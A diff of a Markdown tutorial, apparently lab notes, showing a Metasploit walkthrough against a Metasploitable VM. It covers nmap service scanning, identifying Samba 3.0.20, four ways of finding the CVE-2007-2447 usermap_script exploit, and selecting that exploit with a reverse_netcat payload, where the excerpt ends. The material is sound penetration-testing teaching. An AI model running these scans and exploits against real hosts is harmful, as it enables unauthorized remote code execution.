@@ -43,7 +43,7 @@ msf6 > workspace -a metasploitable
 # using the flag `-sV` will also query the open ports to try to identify the services
 msf6 > db_nmap -n -sV 172.16.115.129
 [*] Nmap: Starting Nmap ...
-...
+[...]
 
 # is only one host now but using the `host` command you can see all the hosts in this workspace
 msf6 > hosts
@@ -71,7 +71,7 @@ host            port   proto  name         state  info
 172.16.115.129  512    tcp    exec         open   netkit-rsh rexecd
 172.16.115.129  513    tcp    login        open   OpenBSD or Solaris rlogind
 172.16.115.129  514    tcp    shell        open   Netkit rshd
-...
+[...]
 
 # using a dedicated module we may get better information about Samba's version
 msf6 > use auxiliary/scanner/smb/smb_version
@@ -92,26 +92,58 @@ Services
 ========
 host            port   proto  name         state  info
 ----            ----   -----  ----         -----  ----
-...
+[...]
 172.16.115.129  445    tcp    smb          open   Unix (Samba 3.0.20-Debian)
-...
+[...]
+```
 
-# Note: is faster to use `search Samba` because the list of available
-# exploits is way shorter that the list of vulnerabilities, but ...
+## Find an exploit
 
-# using OpenVAS ...
-# ... or searching for Samba in [NIST - Search Vulnerability Database](https://nvd.nist.gov/vuln/search)
-# ... or searching for Samba in [MITRE - Search CVE List](https://cve.mitre.org/cve/search_cve_list.html)
-# (I have used "Samba code" as a search term)
-# we can find that CVE-2007-2447 allow remote attackers to execute arbitrary code in Samba version 3.0.20
-# do we have an exploit for this one ?
+**Method  1** Is faster to use `search Samba` because the list of available
+exploits is way shorter that the list of vulnerabilities
+
+**Method 2** Find the exploits with `searchsploit samba` :
+
+```sh
+$ searchsploit samba
+[...]
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb
+```
+
+then search the exploit in Metasploit:
+
+```sh
+msf6 > search username map
+Matching Modules
+================
+   #  Name                                        Disclosure Date  Rank       Check  Description
+[...]
+   3  exploit/multi/samba/usermap_script          2007-05-14       excellent  No     Samba "username map script" Command Execution
+```
+
+**Method 3** Scan the host with GVM (OpenVAS) or another vulnerability scanner then, if a vulnerability
+is found search it in Metasploit:
+
+```sh
 msf6 auxiliary(scanner/smb/smb_version) > search CVE-2007-2447
 Matching Modules
 ================
    #  Name                                Disclosure Date  Rank       Check  Description
    -  ----                                ---------------  ----       -----  -----------
    0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+```
 
+**Method 4** Search for Samba in a CVE list:
+
+- [NIST - Search Vulnerability Database](https://nvd.nist.gov/vuln/search)
+- [MITRE - Search CVE List](https://cve.mitre.org/cve/search_cve_list.html)
+- etc.
+
+I have used "Samba code" as a search term and found that CVE-2007-2447 allows remote attackers to execute arbitrary code in Samba version 3.0.20.
+
+## Exploit
+
+```sh
 # select the exploit
 msf6 auxiliary(scanner/smb/smb_version) > use exploit/multi/samba/usermap_script
 [*] Using configured payload cmd/unix/reverse_netcat
